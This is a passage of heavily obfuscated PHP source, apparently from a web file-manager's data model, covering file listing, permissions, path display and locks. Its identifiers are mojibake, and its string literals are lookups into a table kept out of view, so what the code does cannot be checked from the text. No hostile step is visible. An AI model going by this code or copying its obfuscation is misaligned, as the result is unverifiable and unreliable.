&& $ªÕ™°í° && isset($Ò³¾¾¸[$ŒŠÍ•ıš[$íŞ®ˆà[402]]])) { $ŒŠÍ•ıš[$íŞ®ˆà[87]][$íŞ®ˆà[482]] = array(); foreach ($Ò³¾¾¸[$ŒŠÍ•ıš[$íŞ®ˆà[402]]] as $áÙÎ‹µ) { $èŒİ¶Šä = $ªÕ™°í°[$áÙÎ‹µ]; $ŒŠÍ•ıš[$íŞ®ˆà[87]][$íŞ®ˆà[482]][] = array($íŞ®ˆà[483] => $èŒİ¶Šä[$íŞ®ˆà[399]], $íŞ®ˆà[420] => $èŒİ¶Šä[$íŞ®ˆà[32]], $íŞ®ˆà[484] => $èŒİ¶Šä[$íŞ®ˆà[485]]); } } if ($Šµãï && isset($Šµãï[$ŒŠÍ•ıš[$íŞ®ˆà[402]]])) { $ŒŠÍ•ıš[$íŞ®ˆà[87]][$íŞ®ˆà[486]] = array(); foreach ($Šµãï[$ŒŠÍ•ıš[$íŞ®ˆà[402]]] as $Ê©¯È) { $‰Œ“Ñ¾Ë = $íŞ®ˆà[487]; if ($Ê©¯È[$íŞ®ˆà[488]] == $íŞ®ˆà[88]) { $‰Œ“Ñ¾Ë .= $íŞ®ˆà[489]; } $ŒŠÍ•ıš[$íŞ®ˆà[87]][$íŞ®ˆà[486]] = array_field_key($Ê©¯È, explode($íŞ®ˆà[50], $‰Œ“Ñ¾Ë)); } } } unset($ŒŠÍ•ıš); return $¼§¢ğñ; } protected function _listAppendChildren(&$Ÿ®âË€², $‚ŸŞšŠ) { $“­óÆë€ =& $_SERVER[­á Ş³Ö]; $íÄ” = array(); $²‘Ü¶î• = array($“­óÆë€[207] => 0, $“­óÆë€[208] => 0); foreach ($Ÿ®âË€² as &$Í´—£ûı) { if (!$Í´—£ûı[$“­óÆë€[410]]) { continue; } $íÄ”[] = $Í´—£ûı[$“­óÆë€[402]]; } unset($Í´—£ûı); if (!$íÄ”) { return; } $üêÎ·üÎ = array($“­óÆë€[432] => array($“­óÆë€[7], $íÄ”), $“­óÆë€[431] => 0); $Ê·²™Ù = array($“­óÆë€[432], $“­óÆë€[410], $“­óÆë€[490] => $“­óÆë€[491]); $ñŸ•×³Ì = $this->field($Ê·²™Ù)->where($üêÎ·üÎ)->group($“­óÆë€[492])->select(); $ÕÃ‰©Ğ = array(); foreach ($ñŸ•×³Ì as $¶Ñ©Óäï) { $Ì±„ÊïÍ = $¶Ñ©Óäï[$“­óÆë€[432]]; $Ø‡ôÛËö = $¶Ñ©Óäï[$“­óÆë€[410]] == $“­óÆë€[88] ? $“­óÆë€[208] : $“­óÆë€[207]; if (!isset($ÕÃ‰©Ğ[$Ì±„ÊïÍ])) { $ÕÃ‰©Ğ[$Ì±„ÊïÍ] = array($“­óÆë€[207] => 0, $“­óÆë€[208] => 0); } $ÕÃ‰©Ğ[$Ì±„ÊïÍ][$Ø‡ôÛËö] += $¶Ñ©Óäï[$“­óÆë€[491]]; } foreach ($Ÿ®âË€² as &$Í´—£ûı) { if (!$Í´—£ûı[$“­óÆë€[410]]) { continue; } $ğë¿îŸŞ = is_array($ÕÃ‰©Ğ[$Í´—£ûı[$“­óÆë€[402]]]) ? $ÕÃ‰©Ğ[$Í´—£ûı[$“­óÆë€[402]]] : $²‘Ü¶î•; $Í´—£ûı[$“­óÆë€[208]] = $ğë¿îŸŞ[$“­óÆë€[208]]; $Í´—£ûı[$“­óÆë€[207]] = $ğë¿îŸŞ[$“­óÆë€[207]]; unset($Í´—£ûı[$“­óÆë€[412]]); } unset($Í´—£ûı); } protected function _listAppendAuth(&$Û‰‰ã) { $ä“”š›ô =& $_SERVER[­á Ş³Ö]; $ò€ÈĞÎ = array(); foreach ($Û‰‰ã as $Ÿ’’Éİã) { if ($Ÿ’’Éİã[$ä“”š›ô[411]] == self::TYPE_GROUP) { $ò€ÈĞÎ[] = $Ÿ’’Éİã[$ä“”š›ô[402]]; } } if (!$ò€ÈĞÎ) { return; } $Ÿ£ËÓï¹ = array_to_keyvalue($Û‰‰ã, $ä“”š›ô[402]); $ÍãŒÍ = Model($ä“”š›ô[493])->getSourceList($ò€ÈĞÎ, $Ÿ£ËÓï¹); $›‚™€æ¼ = $GLOBALS[$ä“”š›ô[494]] == 1; foreach ($Û‰‰ã as $Ğ¦ÈíÖ¦ => &$Ÿ’’Éİã) { $Ÿ’’Éİã[$ä“”š›ô[413]] = $ÍãŒÍ[$Ÿ’’Éİã[$ä“”š›ô[402]]]; if (!$Ÿ’’Éİã[$ä“”š›ô[413]] && $Ÿ’’Éİã[$ä“”š›ô[411]] == self::TYPE_GROUP) { $Ÿ’’Éİã[$ä“”š›ô[413]] = Action($ä“”š›ô[495])->pathGroupAuthMake($Ÿ’’Éİã[$ä“”š›ô[496]]); if (!$Ÿ’’Éİã[$ä“”š›ô[413]] && !$›‚™€æ¼) { $Ÿ’’Éİã[$ä“”š›ô[203]] = !1; $Ÿ’’Éİã[$ä“”š›ô[202]] = !1; } } if ($Ÿ’’Éİã[$ä“”š›ô[413]]) { $Ÿ’’Éİã[$ä“”š›ô[203]] = AuthModel::authCheckEdit($Ÿ’’Éİã[$ä“”š›ô[413]][$ä“”š›ô[414]]); $Ÿ’’Éİã[$ä“”š›ô[202]] = AuthModel::authCheckView($Ÿ’’Éİã[$ä“”š›ô[413]][$ä“”š›ô[414]]); } $this->groupPathDisplay($Ÿ’’Éİã); } unset($Ÿ’’Éİã); } public function _listAppendAuthSecret(&$ÆÉ’˜ÀÒ) { $ŞêÖó„’ =& $_SERVER[­á Ş³Ö]; if (Model($ŞêÖó„’[435])->get($ŞêÖó„’[497]) != $ŞêÖó„’[88]) { return; } static $—ÅãİÜÓ = false; if (!$—ÅãİÜÓ) { $Ç§¡ƒø’ = Model($ŞêÖó„’[498]); $’âê¤Şš = Model($ŞêÖó„’[499]); $—ÅãİÜÓ = $’âê¤Şš->listData(); $—ÅãİÜÓ = array_to_keyvalue($—ÅãİÜÓ, $ŞêÖó„’[402]); $õ¦Ì¸ê = json_decode(Model($ŞêÖó„’[435])->get($ŞêÖó„’[500]), !0); $õ¦Ì¸ê = array_to_keyvalue($õ¦Ì¸ê, $ŞêÖó„’[399]); foreach ($—ÅãİÜÓ as $ë‘¤Ö¥ => $Â  °ãÓ) { $¾åµôÄÑ = $õ¦Ì¸ê[$Â  °ãÓ[$ŞêÖó„’[501]]]; if (!$¾åµôÄÑ) { $’âê¤Şš->remove($Â  °ãÓ[$ŞêÖó„’[399]]); unset($—ÅãİÜÓ[$ë‘¤Ö¥]); continue; } $ÈÉëÆ¥ = $Ç§¡ƒø’->listData($¾åµôÄÑ[$ŞêÖó„’[413]]); if (!$ÈÉëÆ¥) { $’âê¤Şš->remove($Â  °ãÓ[$ŞêÖó„’[399]]); unset($—ÅãİÜÓ[$ë‘¤Ö¥]); continue; } $Â  °ãÓ[$ŞêÖó„’[413]] = $ÈÉëÆ¥; $Â  °ãÓ[$ŞêÖó„’[502]] = $¾åµôÄÑ; $Â  °ãÓ[$ŞêÖó„’[503]] = Model($ŞêÖó„’[504])->getInfoSimpleOuter($Â  °ãÓ[$ŞêÖó„’[454]]); $—ÅãİÜÓ[$ë‘¤Ö¥] = $Â  °ãÓ; } } $¹´éÕŸ¶ = USER_ID; $ıÚİŠ´» = array(); $ñ™¿¨Œ = $this->_listAppendPath($ıÚİŠ´», !0); foreach ($ÆÉ’˜ÀÒ as $ë‘¤Ö¥ => &$Â  °ãÓ) { if (!is_array($Â  °ãÓ[$ŞêÖó„’[413]])) { continue; } if ($Â  °ãÓ[$ŞêÖó„’[411]] != $ŞêÖó„’[505]) { continue; } if (isset($—ÅãİÜÓ[$Â  °ãÓ[$ŞêÖó„’[402]]])) { $éÇÇîŞ  = $—ÅãİÜÓ[$Â  °ãÓ[$ŞêÖó„’[402]]]; if (!is_array($Â  °ãÓ[$ŞêÖó„’[466]])) { $Â  °ãÓ[$ŞêÖó„’[466]] = array(); } $Â  °ãÓ[$ŞêÖó„’[466]][$ŞêÖó„’[506]] = $éÇÇîŞ [$ŞêÖó„’[501]]; $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[507]] = $éÇÇîŞ ; $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[508]] = $Â  °ãÓ[$ŞêÖó„’[509]]; $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[510]] = $ŞêÖó„’[88]; if ($éÇÇîŞ [$ŞêÖó„’[454]] != $¹´éÕŸ¶) { $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[414]] = $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[414]] & $éÇÇîŞ [$ŞêÖó„’[413]][$ŞêÖó„’[413]]; } continue; } $´©ÑŞ‡Î = $this->parentLevelArray($Â  °ãÓ[$ŞêÖó„’[511]]); $ß•ˆÁŞü = array_reverse($´©ÑŞ‡Î); foreach ($ß•ˆÁŞü as $àªùûŠ => $çœÂ’) { if (!isset($—ÅãİÜÓ[$çœÂ’])) { continue; } $éÇÇîŞ  = $—ÅãİÜÓ[$çœÂ’]; $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[507]] = $éÇÇîŞ ; if ($éÇÇîŞ [$ŞêÖó„’[454]] != $¹´éÕŸ¶) { $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[414]] = $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[414]] & $éÇÇîŞ [$ŞêÖó„’[413]][$ŞêÖó„’[413]]; } $·Ô¦·²£ = $ŞêÖó„’[12]; $é™òêªÔ = count($´©ÑŞ‡Î) - $àªùûŠ; for ($àÏ‘ç = 0; $àÏ‘ç < $é™òêªÔ; $àÏ‘ç++) { if (!isset($ñ™¿¨Œ[$´©ÑŞ‡Î[$àÏ‘ç]])) { $·Ô¦·²£ = $ŞêÖó„’[12]; break; } $·Ô¦·²£ = $·Ô¦·²£ . rtrim($ñ™¿¨Œ[$´©ÑŞ‡Î[$àÏ‘ç]], $ŞêÖó„’[8]) . $ŞêÖó„’[8]; } $Â  °ãÓ[$ŞêÖó„’[413]][$ŞêÖó„’[508]] = rtrim($·Ô¦·²£, $ŞêÖó„’[8]) . $ŞêÖó„’[8]; break; } } unset($Â  °ãÓ); } public function groupPathDisplay(&$û®œÉƒì) { $Õ¢ó‚· =& $_SERVER[­á Ş³Ö]; if ($û®œÉƒì[$Õ¢ó‚·[411]] != self::TYPE_GROUP) { return; } $úü©‡æ€ = Model($Õ¢ó‚·[512])->getInfo($û®œÉƒì[$Õ¢ó‚·[496]]); $ÂÕçÄ™– = $this->parentLevelArray($úü©‡æ€[$Õ¢ó‚·[511]]); $«„¨áÏ = $Õ¢ó‚·[12]; foreach ($ÂÕçÄ™– as $îûÌĞ…ä) { $‘›®ò = Model($Õ¢ó‚·[512])->getInfo($îûÌĞ…ä); $«„¨áÏ .= $‘›®ò[$Õ¢ó‚·[87]][$Õ¢ó‚·[402]] . $Õ¢ó‚·[50]; } $û®œÉƒì[$Õ¢ó‚·[513]] = $úü©‡æ€[$Õ¢ó‚·[432]]; $û®œÉƒì[$Õ¢ó‚·[514]] = $úü©‡æ€[$Õ¢ó‚·[511]]; $û®œÉƒì[$Õ¢ó‚·[515]] = $úü©‡æ€[$Õ¢ó‚·[516]]; $û®œÉƒì[$Õ¢ó‚·[517]] = $«„¨áÏ . $úü©‡æ€[$Õ¢ó‚·[87]][$Õ¢ó‚·[402]]; } protected function _listAppendPath(&$ËÉí–àë, $Ö´¤ìÎÙ = false) { $Ê¥áÊ­ =& $_SERVER[­á Ş³Ö]; static $ÌèÊ®íÁ = array(); $†ŒşÊù¹ = array(); $Å“Œª = array(); if ($Ö´¤ìÎÙ) { return $ÌèÊ®íÁ; } foreach ($ËÉí–àë as &$Æş©üÇ) { $€¢Ò•èŸ = $Æş©üÇ[$Ê¥áÊ­[402]]; if ($Æş©üÇ[$Ê¥áÊ­[410]] == $Ê¥áÊ­[88] && $Æş©üÇ[$Ê¥áÊ­[432]] != 0) { $ÌèÊ®íÁ[$€¢Ò•èŸ] = $Æş©üÇ[$Ê¥áÊ­[32]]; } if ($Æş©üÇ[$Ê¥áÊ­[410]] == $Ê¥áÊ­[88] && $Æş©üÇ[$Ê¥áÊ­[432]] == 0 && !isset($ÌèÊ®íÁ[$€¢Ò•èŸ])) { $ÌèÊ®íÁ[$€¢Ò•èŸ] = $this->_listAppendPathRoot($Æş©üÇ, array()); } if (isset($Å“Œª[$Æş©üÇ[$Ê¥áÊ­[511]]])) { continue; } $Å“Œª[$Æş©üÇ[$Ê¥áÊ­[511]]] = !0; $¢ÁÆç Í = $this->parentLevelArray($Æş©üÇ[$Ê¥áÊ­[511]]); foreach ($¢ÁÆç Í as $¾Şê“Š => $§ê¸Ùš¶) { if (isset($ÌèÊ®íÁ[$§ê¸Ùš¶])) { continue; } if ($¾Şê“Š == 0) { $ÌèÊ®íÁ[$§ê¸Ùš¶] = $this->_listAppendPathRoot($Æş©üÇ, $¢ÁÆç Í); } if ($¾Şê“Š != 0) { $†ŒşÊù¹[] = $§ê¸Ùš¶; } } } unset($Æş©üÇ); $†ŒşÊù¹ = array_unique($†ŒşÊù¹); if (count($†ŒşÊù¹) > 0) { $Ç·¦Æ¢÷ = array($Ê¥áÊ­[417] => array($Ê¥áÊ­[418], $†ŒşÊù¹)); if (count($†ŒşÊù¹) == 1) { $Éœó®é = $this->sourceInfo($†ŒşÊù¹[0]); $Í†é¡ = is_array($Éœó®é) ? array($Éœó®é) : !1; } else { $Í†é¡ = $this->field($Ê¥áÊ­[518])->where($Ç·¦Æ¢÷)->select(); } if (!$Í†é¡) { $Í†é¡ = array(); } foreach ($Í†é¡ as $ûı–Ÿß) { $ÌèÊ®íÁ[$ûı–Ÿß[$Ê¥áÊ­[402]]] = $ûı–Ÿß[$Ê¥áÊ­[32]]; } } $ÓÔŠ÷£Å = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $æ¯êŒşö = array(); foreach ($ËÉí–àë as &$Æş©üÇ) { $ı ÁùÕÜ = $Æş©üÇ[$Ê¥áÊ­[511]]; $¨¦³İà« = $Ê¥áÊ­[12]; if (isset($æ¯êŒşö[$ı ÁùÕÜ])) { $¨¦³İà« = $æ¯êŒşö[$ı ÁùÕÜ]; } else { $¢ÁÆç Í = $this->parentLevelArray($Æş©üÇ[$Ê¥áÊ­[511]]); foreach ($¢ÁÆç Í as $¾Şê“Š => $§ê¸Ùš¶) { if (isset($ÌèÊ®íÁ[$§ê¸Ùš¶])) { $¨¦³İà« .= $ÌèÊ®íÁ[$§ê¸Ùš¶] . $Ê¥áÊ­[8]; } } $æ¯êŒşö[$ı ÁùÕÜ] = $¨¦³İà«; } $¨¦³İà« .= $Æş©üÇ[$Ê¥áÊ­[32]]; if ($Æş©üÇ[$Ê¥áÊ­[410]] == $Ê¥áÊ­[88]) { $¨¦³İà« .= $Ê¥áÊ­[8]; } $Æş©üÇ[$Ê¥áÊ­[509]] = str_replace($Ê¥áÊ­[519], $Ê¥áÊ­[8], $¨¦³İà«); if ($Æş©üÇ[$Ê¥áÊ­[432]] == $Ê¥áÊ­[198]) { $Æş©üÇ[$Ê¥áÊ­[32]] = trim($ÌèÊ®íÁ[$Æş©üÇ[$Ê¥áÊ­[402]]], $Ê¥áÊ­[8]); $Æş©üÇ[$Ê¥áÊ­[509]] = $Æş©üÇ[$Ê¥áÊ­[32]] . $Ê¥áÊ­[8]; } if (intval($Æş©üÇ[$Ê¥áÊ­[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Æş©üÇ, $¢ÁÆç Í, $ÓÔŠ÷£Å); } } unset($Æş©üÇ); return $ËÉí–àë; } private function _listAppendPathRecycle(&$»™éãıƒ, $ı’ôŒ†Å, $”š¹Ô¥) { $šÇ¦ ü† =& $_SERVER[­á Ş³Ö]; if (!in_array($”š¹Ô¥, $ı’ôŒ†Å) && $»™éãıƒ[$šÇ¦ ü†[402]] != $”š¹Ô¥) { return; } $ò¬ôÑÙÂ = explode($šÇ¦ ü†[8], trim($»™éãıƒ[$šÇ¦ ü†[509]], $šÇ¦ ü†[8])); $Â¡Î‹êß = implode($šÇ¦ ü†[8], array_slice($ò¬ôÑÙÂ, 2)); $»™éãıƒ[$šÇ¦ ü†[509]] = $šÇ¦ ü†[8] . LNG($šÇ¦ ü†[520]) . $šÇ¦ ü†[8] . ltrim($Â¡Î‹êß, $šÇ¦ ü†[8]); $»™éãıƒ[$šÇ¦ ü†[511]] = $šÇ¦ ü†[521] . implode($šÇ¦ ü†[50], array_slice($ı’ôŒ†Å, 1)) . $šÇ¦ ü†[50]; if ($»™éãıƒ[$šÇ¦ ü†[402]] == $”š¹Ô¥) { $»™éãıƒ[$šÇ¦ ü†[511]] = $šÇ¦ ü†[521]; $»™éãıƒ[$šÇ¦ ü†[432]] = $šÇ¦ ü†[198]; $»™éãıƒ[$šÇ¦ ü†[32]] = LNG($šÇ¦ ü†[520]); } $»™éãıƒ[$šÇ¦ ü†[522]] = $šÇ¦ ü†[523]; } protected function _listAppendPathRoot(&$‰‡Âãïğ, $ªôĞ¤ñ­) { $×¡“ïÆ =& $_SERVER[­á Ş³Ö]; static $ª¯Ä…§Ü = false; $œäîÓÅ = $×¡“ïÆ[12]; if ($‰‡Âãïğ[$×¡“ïÆ[411]] == self::TYPE_USER) { if ($‰‡Âãïğ[$×¡“ïÆ[496]] == USER_ID) { $œäîÓÅ = LNG($×¡“ïÆ[524]); if ($ª¯Ä…§Ü === !1) { $Š­’ÛÖ = Model($×¡“ïÆ[525])->getInfoFull(USER_ID); $ª¯Ä…§Ü = _get($Š­’ÛÖ, $×¡“ïÆ[526], $×¡“ïÆ[12]); } if ($ªôĞ¤ñ­ && $ªôĞ¤ñ­[0] == $ª¯Ä…§Ü || !$ªôĞ¤ñ­ && $‰‡Âãïğ[$×¡“ïÆ[402]] == $ª¯Ä…§Ü) { $œäîÓÅ = LNG($×¡“ïÆ[527]); $‰‡Âãïğ[$×¡“ïÆ[528]] = $×¡“ïÆ[529]; } if (!$ªôĞ¤ñ­) { $‰‡Âãïğ[$×¡“ïÆ[32]] = $œäîÓÅ; } } else { $³ÆÏë ˆ = Model($×¡“ïÆ[504])->getInfoSimple($‰‡Âãïğ[$×¡“ïÆ[496]]); $œäîÓÅ = LNG($×¡“ïÆ[530]) . $×¡“ïÆ[162] . $³ÆÏë ˆ[$×¡“ïÆ[32]] . $×¡“ïÆ[164]; $‰‡Âãïğ[$×¡“ïÆ[531]] = array($×¡“ïÆ[32] => $³ÆÏë ˆ[$×¡“ïÆ[32]], $×¡“ïÆ[532] => $³ÆÏë ˆ[$×¡“ïÆ[532]], $×¡“ïÆ[533] => $³ÆÏë ˆ[$×¡“ïÆ[533]]); } } else { if ($‰‡Âãïğ[$×¡“ïÆ[411]] == self::TYPE_GROUP) { $³ÆÏë ˆ = Model($×¡“ïÆ[512])->getInfoSimple($‰‡Âãïğ[$×¡“ïÆ[496]]); $œäîÓÅ = $³ÆÏë ˆ[$×¡“ïÆ[32]]; } else { if ($‰‡Âãïğ[$×¡“ïÆ[411]] == self::TYPE_SYSTEM) { $œäîÓÅ = $×¡“ïÆ[534]; } } } $œäîÓÅ = $œäîÓÅ ? $×¡“ïÆ[8] . $œäîÓÅ . $×¡“ïÆ[8] : $×¡“ïÆ[8]; return $œäîÓÅ; } protected function _listAppendUser(&$ÎûÎğšå) { $ç·¨ÜÔ =& $_SERVER[­á Ş³Ö]; $øÖ…–¶ = array_to_keyvalue($ÎûÎğšå, $ç·¨ÜÔ[12], $ç·¨ÜÔ[454]); $ÔÜşı©ƒ = array_to_keyvalue($ÎûÎğšå, $ç·¨ÜÔ[12], $ç·¨ÜÔ[456]); $øª¡Íƒ° = array_merge($øÖ…–¶, $ÔÜşı©ƒ); $®„¨ĞÎ = Model($ç·¨ÜÔ[525])->userListInfo($øª¡Íƒ°); foreach ($ÎûÎğšå as &$É‹ÜáÄ) { $”¤ãàäİ = $É‹ÜáÄ[$ç·¨ÜÔ[454]]; $É‹ÜáÄ[$ç·¨ÜÔ[454]] = $®„¨ĞÎ[$”¤ãàäİ] ? $®„¨ĞÎ[$”¤ãàäİ] : !1; $”¤ãàäİ = $É‹ÜáÄ[$ç·¨ÜÔ[456]]; $É‹ÜáÄ[$ç·¨ÜÔ[456]] = $®„¨ĞÎ[$”¤ãàäİ] ? $®„¨ĞÎ[$”¤ãàäİ] : !1; if (isset($É‹ÜáÄ[$ç·¨ÜÔ[466]]) && $É‹ÜáÄ[$ç·¨ÜÔ[466]][$ç·¨ÜÔ[535]]) { $ÌŞ˜Şôã = $GLOBALS[$ç·¨ÜÔ[6]][$ç·¨ÜÔ[89]][$ç·¨ÜÔ[536]]; if ($É‹ÜáÄ[$ç·¨ÜÔ[466]][$ç·¨ÜÔ[537]] <= time() - $ÌŞ˜Şôã) { $this->metaSet($É‹ÜáÄ[$ç·¨ÜÔ[402]], $ç·¨ÜÔ[535], null); $this->metaSet($É‹ÜáÄ[$ç·¨ÜÔ[402]], $ç·¨ÜÔ[537], null); unset($É‹ÜáÄ[$ç·¨ÜÔ[466]][$ç·¨ÜÔ[535]]); continue; } $Ä¥ËÔó = $É‹ÜáÄ[$ç·¨ÜÔ[466]][$ç·¨ÜÔ[535]]; $É‹ÜáÄ[$ç·¨ÜÔ[466]][$ç·¨ÜÔ[538]] = Model($ç·¨ÜÔ[525])->getInfoSimpleOuter($Ä¥ËÔó); } } unset($É‹ÜáÄ); } public function parentLevelArray($ãªç×ò) { $†ğ‘ÑşŸ =& $_SERVER[­á Ş³Ö]; $ãªç×ò = explode($†ğ‘ÑşŸ[50], trim($ãªç×ò, $†ğ‘ÑşŸ[50])); return array_remove_value($ãªç×ò, $†ğ‘ÑşŸ[198]); } public function listAll($«¼›š»Î) { $††”Ô¯º =& $_SERVER[­á Ş³Ö]; $íç¼¦˜ó = $this->sourceInfo($«¼›š»Î); $‡úÑŞÎ‚ = array($††”Ô¯º[539] => array($††”Ô¯º[540], $íç¼¦˜ó[$††”Ô¯º[511]] . $«¼›š»Î . $††”Ô¯º[541]), $††”Ô¯º[542] => 0); $Ç¡–ó„ª = $††”Ô¯º[543]; $¼æ¹ğÜé = "\114\x45\x46\x54\x20\112\117\111\116\40{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\145\40\x66\151\x6c\145\x20\157\x6e\40\163\x6f\x75\x72\143\145\x2e\146\151\x6c\145\x49\x44\40\75\x20\146\x69\154\145\x2e\146\x69\154\145\x49\104"; $äºÕ…å– = $this->alias($††”Ô¯º[446])->field($Ç¡–ó„ª)->where($‡úÑŞÎ‚)->join($¼æ¹ğÜé)->select(); $this->_listAppendAuth($äºÕ…å–); $this->_listAppendUser($äºÕ…å–); $this->_listAppendPath($äºÕ…å–); $äºÕ…å– = array_to_keyvalue($äºÕ…å–, $††”Ô¯º[402]); $ª¢±·À· = "\x2f{$íç¼¦˜ó[$††”Ô¯º[32]]}\57"; $ª¢±·À· = $ª¢±·À· == $††”Ô¯º[519] ? $††”Ô¯º[8] : $ª¢±·À·; $¿·ú’Ùê = array(); foreach ($äºÕ…å– as $ËÎßÄ => $•ô¾¥÷¡) { $õ…¤¿Ú¸ = $this->parentLevelArray($•ô¾¥÷¡[$††”Ô¯º[511]]); array_shift($õ…¤¿Ú¸); $ØØ«¹´Ş = $ª¢±·À·; for ($ØşŞ÷ÈÚ = 0; $ØşŞ÷ÈÚ < count($õ…¤¿Ú¸); $ØşŞ÷ÈÚ++) { $ØØ«¹´Ş .= $äºÕ…å–[$õ…¤¿Ú¸[$ØşŞ÷ÈÚ]][$††”Ô¯º[32]] . $††”Ô¯º[8]; } $ØØ«¹´Ş .= $•ô¾¥÷¡[$††”Ô¯º[32]]; if ($•ô¾¥÷¡[$††”Ô¯º[410]]) { $ØØ«¹´Ş .= $††”Ô¯º[8]; } $§á©ë† = array($††”Ô¯º[421] => str_replace($††”Ô¯º[519], $††”Ô¯º[8], str_replace($††”Ô¯º[519], $††”Ô¯º[8], str_replace($††”Ô¯º[519], $††”Ô¯º[8], $ØØ«¹´Ş))), $††”Ô¯º[544] => intval($•ô¾¥÷¡[$††”Ô¯º[410]]), $††”Ô¯º[545] => intval($•ô¾¥÷¡[$††”Ô¯º[76]]), $††”Ô¯º[85] => intval($•ô¾¥÷¡[$††”Ô¯º[85]]), $††”Ô¯º[87] => $this->pathInfoFilter($•ô¾¥÷¡)); if (!$§á©ë†[$††”Ô¯º[410]]) { $§á©ë†[$††”Ô¯º[468]] = $•ô¾¥÷¡[$††”Ô¯º[468]]; } $¿·ú’Ùê[] = $§á©ë†; } $¿·ú’Ùê = array_sort_by($¿·ú’Ùê, $††”Ô¯º[84]); return $¿·ú’Ùê; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($º¸Ì£â) { $ÌúğİÖ =& $_SERVER[­á Ş³Ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÌúğİÖ[546], $º¸Ì£â); $‚ôûµæ = 1; $this->_lockEvent($º¸Ì£â, array($ÌúğİÖ[547], $ÌúğİÖ[548]), $‚ôûµæ); $this->_lockParent($º¸Ì£â, array($ÌúğİÖ[548]), $‚ôûµæ); $this->_lockEvent($º¸Ì£â, array($ÌúğİÖ[549], $ÌúğİÖ[550]), $‚ôûµæ); $this->_lockCheckEnd($ÌúğİÖ[546], $º¸Ì£â); } public function lockCopyEnd($•½†ª¹Ô) { $ñ£ÛÖöç =& $_SERVER[­á Ş³Ö]; if (!$this->allowLock()) { return; } $æˆ–Ûü = 0; $this->_lockEvent($•½†ª¹Ô, array($ñ£ÛÖöç[547], $ñ£ÛÖöç[548]), $æˆ–Ûü); $this->_lockParent($•½†ª¹Ô, array($ñ£ÛÖöç[548]), $æˆ–Ûü); $this->_lockEvent($•½†ª¹Ô, array($ñ£ÛÖöç[549], $ñ£ÛÖöç[550]), $æˆ–Ûü); } public function lockWriteStart($›²¬±¶¦, $òŸ·Ù‰ä = '') { $¤Ì‘² =& $_SERVER[­á Ş³Ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($¤Ì‘²[547], $›²¬±¶¦); $À‚â£‡Á = 1; $this->_lockKey($¤Ì‘²[551] . $›²¬±¶¦ . $¤Ì‘²[10] . $òŸ·Ù‰ä, $À‚â£‡Á); $this->_lockEvent($›²¬±¶¦, array($¤Ì‘²[546], $¤Ì‘²[548]), $À‚â£‡Á); $this->_lockParent($›²¬±¶¦, array($¤Ì‘²[546], $¤Ì‘²[548]), $À‚â£‡Á); $this->_lockCheckEnd($¤Ì‘²[547], $›²¬±¶¦); } public function lockWriteEnd($¿šºâ›Ô, $“›Ÿï¸± = '') { $çö÷ª„Œ =& $_SERVER[­á Ş³Ö]; if (!$this->allowLock()) { return; } $ ÏĞğ¹ = 0; $this->_lockKey($çö÷ª„Œ[551] . $¿šºâ›Ô . $çö÷ª„Œ[10] . $“›Ÿï¸±, $ ÏĞğ¹); $this->_lockEvent($¿šºâ›Ô, array($çö÷ª„Œ[546], $çö÷ª„Œ[548]), $ ÏĞğ¹); $this->_lockParent($¿šºâ›Ô, array($çö÷ª„Œ[546], $çö÷ª„Œ[548]), $ ÏĞğ¹); } public function lockMoveStart($±ğü¦·) { $ÑÀ„é„‘ =& $_SERVER[­á Ş³Ö]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÑÀ„é„‘[548], $±ğü¦·); $ç“”ŸÒï = 1; $this->_lockKey($ÑÀ„é„‘[552] . $±ğü¦·, $ç“”ŸÒï); $this->_lockEvent($±ğü¦·, array($ÑÀ„é„‘[546], $ÑÀ„é„‘[547]), $ç“”ŸÒï); $this->_lockParent($±ğü¦·, array($ÑÀ„é„‘[546], $ÑÀ„é„‘[548]), $ç“”ŸÒï); $this->_lockEvent($±ğü¦·, array($ÑÀ„é„‘[553], $ÑÀ„é„‘[549], $ÑÀ„é„‘[550]), $ç“”ŸÒï); $this->_lockCheckEnd($ÑÀ„é„‘[548], $±ğü¦·); } public function lockMoveEnd($Ùî¸¯ËÔ) { $‰éÃñ¯Ù =& $_SERVER[­á Ş³Ö]; if (!$this->allowLock()) { return; } $¯Ø•¨ó = 0; $this->_lockKey($‰éÃñ¯Ù[552] . $Ùî¸¯ËÔ, $¯Ø•¨ó); $this->_lockEvent($Ùî¸¯ËÔ, array($‰éÃñ¯Ù[546], $‰éÃñ¯Ù[547]), $¯Ø•¨ó); $this->_lockParent($Ùî¸¯ËÔ, array($‰éÃñ¯Ù[546], $‰éÃñ¯Ù[548]), $¯Ø•¨ó); $this->_lockEvent($Ùî¸¯ËÔ, array($‰éÃñ¯Ù[553], $‰éÃñ¯Ù[549], $‰éÃñ¯Ù[550]), $¯Ø•¨ó); } private function _lockCheck($Õê¹¯È, $ÈŒŒƒ³) { $ÖÙ–ÙÁÎ =& $_SERVER[­á Ş³Ö]; $¢Øò­ì· = $this->sourceInfo($ÈŒŒƒ³); $—á°­Ø = $Õê¹¯È . $ÖÙ–ÙÁÎ[10] . $ÈŒŒƒ³; $this->_lockTimeStart[$—á°­Ø] = timeFloat(); if (!is_array($¢Øò­ì·)) { return; } $á‡÷Àá = LNG($ÖÙ–ÙÁÎ[554]); CacheLock::setErrorMsg($ÖÙ–ÙÁÎ[162] . htmlspecialchars($¢Øò­ì·[$ÖÙ–ÙÁÎ[32]]) . $ÖÙ–ÙÁÎ[164] . $á‡÷Àá); $this->_lockKey($—á°­Ø, 1); $this->_lockKey($—á°­Ø, 0); $œ¡ŒĞ¦è = array_reverse($this->parentLevelArray($¢Øò­ì·[$ÖÙ–ÙÁÎ[511]])); foreach 